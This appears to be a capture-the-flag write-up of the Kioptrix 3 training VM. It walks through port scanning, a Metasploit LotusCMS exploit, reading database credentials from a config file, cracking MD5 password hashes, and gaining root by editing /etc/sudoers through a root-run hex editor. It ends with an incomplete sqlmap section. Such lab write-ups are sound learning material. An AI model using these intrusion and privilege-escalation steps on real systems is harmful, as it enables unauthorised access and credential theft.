# Kioptrix 3

Kioptrix 3 is the third of five VMs in the Kioptrix line. True to the author's word, it is quite different from the first two. This one involves exploiting a web application rather than a known vulnerability.

VM can be downloaded at [Vulnhub](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/).

## My Setup
I'll be attacking this in Kali Linux from VirtualBox on Windows. As with all the other CTFs I've done, they're on a shared NATNetwork with Kali.

**IP Range:** The IP range I have set for the NATNetwork is 10.0.2.0/24.

## VM Discovery
Nmap's ping scan is handy for this. Just use the -sP flag with your desired IP range.

```bash
rroot@kali:~/Desktop/k3# nmap -sP 10.0.2.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-02 20:01 EST
...
MAC Address: 08:00:27:86:B5:9F (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.16
Host is up (0.00023s latency).
...
Nmap done: 256 IP addresses (5 hosts up) scanned in 15.03 seconds
```

Our target is 10.0.2.16.

## Port Scan
While it mentions a web app, we might as well see if there's anything else.

```bash
root@kali:~/Desktop/k3# nmap -sS -sV -T4 -p- 10.0.2.16
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-02 20:02 EST
Nmap scan report for 10.0.2.16
Host is up (0.00013s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: 08:00:27:D6:57:60 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds
```

Nothing much to go off of here. Even if PHP was vulnerable, we'd need to write a file to the server to take advantage of it.

### Hosts
Before we go on, the VM requests we add the VM's IP address as "kioptrix3.com" to the hosts file.

## La Galerie
The hompeage mentions a new gallery CMS.

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/kioptrix3/homepage.PNG" alt="">
  <figcaption>Ligoat Security homepage.</figcaption>
</figure>

So, as the homepage want, let's cut to the chase and view the "new gallery".

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/kioptrix3/gallery.PNG" alt="">
  <figcaption>The new gallery.</figcaption>
</figure>

If we poke around, it's possible to view individual images, recent photos, total views, etc. Aside from the images, one thing to always be on the lookout for, especially with older or easier CTFs, is the possibility for SQL injection.

Looking at the "Ligoat Press Room" gallery, there's a photo sorting option down in the lower left.

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/kioptrix3/sorting_options.PNG" alt="">
  <figcaption>Photo sorting</figcaption>
</figure>

When we click this, it updates the URL with some additional parameters.

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/kioptrix3/url.PNG" alt="">
  <figcaption>Updated URL, now with PHP_GET</figcaption>
</figure>

Before we go too much further, let's check out the login page. It looks a little different, with a note saying it's "proudly powered" by LotusCMS.

Often times, when you find a system is running something, it's always good to run a quick searchsploit for it.

## LotusCMS

```bash
root@kali:~/Desktop/k3# searchsploit lotuscms

```

Currently, we don't know what version of LotusCMS is running, but let's try the Remote Command one.

```bash
root@kali:~/Desktop/k3# msfconsole
...

msf5 > search lotuscms

```

And hello, Meterpreter! We're currently in the webroot folder. 

Do note, for this, I'm going to add a prompt character (??) to differentiate my commands from the shell's output. In Meterpreter, it's a basic shell, and it's hard to tell what are my commands are what the output is.

```bash
meterpreter > shell
Process 4295 created.
Channel 0 created.
?? whoami
www-data

?? pwd
/home/www/kioptrix3.com

?? ls
cache
core
data
favicon.ico
gallery
gnu-lgpl.txt
index.php
modules
style
update.php
```

I looked around at some of the files in here, but let's check out that 'gallery' directory. After all, that's the hip new thing.

```bash
?? cd gallery

?? ls
BACK
db.sql
g.php
gadmin
gallery.php
gconfig.php
gfooter.php
gfunctions.php
gheader.php
index.php
install.BAK
login.php
logout.php
p.php
photos
photos.php
post_comment.php
profile.php
readme.html
recent.php
register.php
scopbin
search.php
slideshow.php
tags.php
themes
version.txt
vote.php
```

Lots of files here. We're after credentials, so my guess is that gconfig.php file.

```bash
?? head gconfig.php -n 20
<?php
	error_reporting(0);
	/*
		A sample Gallarific configuration file. You should edit
		the installer details below and save this file as gconfig.php
		Do not modify anything else if you don't know what it is.
	*/

	// Installer Details -----------------------------------------------

	// Enter the full HTTP path to your Gallarific folder below,
	// such as http://www.yoursite.com/gallery
	// Do NOT include a trailing forward slash

	$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

	$GLOBALS["gallarific_mysql_server"] = "localhost";
	$GLOBALS["gallarific_mysql_database"] = "gallery";
	$GLOBALS["gallarific_mysql_username"] = "root";
	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
```

Spicy password. Running as root as well.

I attempted to call the MySQL CLI, but it doesn't like the basic shell I'm in. So, we'll specify the commands externally.

```bash
?? mysql -u root -p -e 'show databases;'
Enter password: fuckeyou
Database
information_schema
gallery
mysql
```

That gallery database isn't built-in. Let's check it out.

```bash
?? mysql -u root -p -e 'use gallery; show tables;'
Enter password: fuckeyou
Tables_in_gallery
dev_accounts
gallarific_comments
gallarific_galleries
gallarific_photos
gallarific_settings
gallarific_stats
gallarific_users
```

Oh, there's a table for developer accounts. Interesting...

```bash
?? mysql -u root -p -e 'use gallery; select * from dev_accounts;'
Enter password: fuckeyou
id	username	password
1	dreg	0d3eccfb887aabd50f243b3f155c0f85
2	loneferret	5badcaf789d3d1d09794d8f021f40f0e
```

Hashes! Time to put these through John. You could also use an online MD5 cracker.

Either way, you'll get the following:

| User | Hash | Password |
| dreg | 0d3eccfb887aabd50f243b3f155c0f85 | Mast3r |
| loneferret | 5badcaf789d3d1d09794d8f021f40f0e | starwars |

### A word on Hydra
I also ran Hydra with the rockyou.txt wordlist against the target, and it picked up loneferret's password at about the same time I grabbed the hashes from MySQL.

Just goes to show there's more than one way to skin a cat. 

## SSH

We'll try each user and see what all we can run.

```bash
oot@kali:~/Desktop/k3# ssh dreg@10.0.2.16
...
dreg@10.0.2.16's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

dreg@Kioptrix3:~$ getent group sudo
sudo:x:27:
dreg@Kioptrix3:~$ sudo -l
[sudo] password for dreg: 
Sorry, user dreg may not run sudo on Kioptrix3.
```

No one's in the sudoers group. Running 'ps aux' doesn't reveal anything terribly interesting. Let's log in as loneferret and see if there's anything else.

```bash
dreg@Kioptrix3:~$ su -l loneferret
Password: 
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

That's a program I haven't come across. Looking online, HT is a hex editor. Since it runs as root, we could add ourselves to the sudoers file.

```bash
loneferret@Kioptrix3:~$ sudo /usr/local/bin/ht
Error opening terminal: xterm-256color.
loneferret@Kioptrix3:~$ export TERM=xterm
loneferret@Kioptrix3:~$ sudo /usr/local/bin/ht
```

After a minor hiccup, we're in HT.

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/kioptrix3/ht.PNG" alt="">
  <figcaption>HT</figcaption>
</figure>

Hit F3 to open a file. We want /etc/sudoers.

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/kioptrix3/ht_open.PNG" alt="">
  <figcaption>HT Open File dialog</figcaption>
</figure>

We want to replace loneferret's line with root's.

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/kioptrix3/ht_users.PNG" alt="">
  <figcaption>Sudoers File</figcaption>
</figure>

Just like so:

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/kioptrix3/ht_mod.PNG" alt="">
  <figcaption>Loneferret's new permissions</figcaption>
</figure>

Hit F2 to save, then F10 to exit.

Let's check our permissions.

```bash
loneferret@Kioptrix3:~$ sudo -l
[sudo] password for loneferret: 
User loneferret may run the following commands on this host:
    (ALL) ALL
loneferret@Kioptrix3:~$ sudo /bin/bash
root@Kioptrix3:~# 
```

The octothorpe of victory. Let's grab our flag.

## Victory

```bash
root@Kioptrix3:~# cd /root
root@Kioptrix3:/root# ls
Congrats.txt  ht-2.0.18
root@Kioptrix3:/root# cat Congrats.txt 
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS: 
http://www.lotuscms.org

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```

## SQL Injection Method
If you're new to SQL injection, one of the best tools (if a little noisy) is SQLMap. Let's run the new URL through it and see if it can automatically detect the vulnerability.

```bash
root@kali:~# sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos
[1] 5730
root@kali:~#         ___
       __H__
 ___ ___["]_____ ___ ___  {1.3#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

As you can see, it identified the 'id' parameter within the URL. In addition, SQLMap ran some automated tests and got some back-end server information. We can give a couple arguments to SQLMap to grab some more info from the database.
